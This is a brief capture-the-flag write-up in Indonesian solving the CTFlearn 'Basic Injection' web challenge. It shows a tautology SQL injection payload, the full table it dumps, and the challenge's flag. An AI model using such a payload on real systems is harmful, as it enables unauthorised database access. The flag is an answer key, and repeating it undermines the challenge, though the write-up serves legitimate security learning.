# Basic Injection (30 Points)
See if you can leak the whole database. The flag is in there somwhere… https://web.ctflearn.com/web4/
# Solved
Challenge kali ini, kita disuruh menginput <b>SQL Injection</b> params. Query yang kemungkinan di pakai dalam website tersebut ialah
```sql
SELECT * FROM data WHERE name = 'any'
```
Bisa kita lihat pada query tersebut akan mengambil sebuah data khusus, bagaimana jika kita ingin mengambil semua data ? inilah exploit nya
```sql
' OR '1' = '1
```
Hasil :
```
Name: Luke
Data: I made this problem.
Name: Alec
Data: Steam boys.
Name: Jalen
Data: Pump that iron fool.
Name: Eric
Data: I make cars.
Name: Sam
Data: Thinks he knows SQL.
Name: fl4g__giv3r
Data: th4t_is_why_you_n33d_to_sanitiz3_inputs
Name: snoutpop
Data: jowls
Name: Chunbucket
Data: @datboiiii
```
Flag : <b>th4t_is_why_you_n33d_to_sanitiz3_inputs</b>
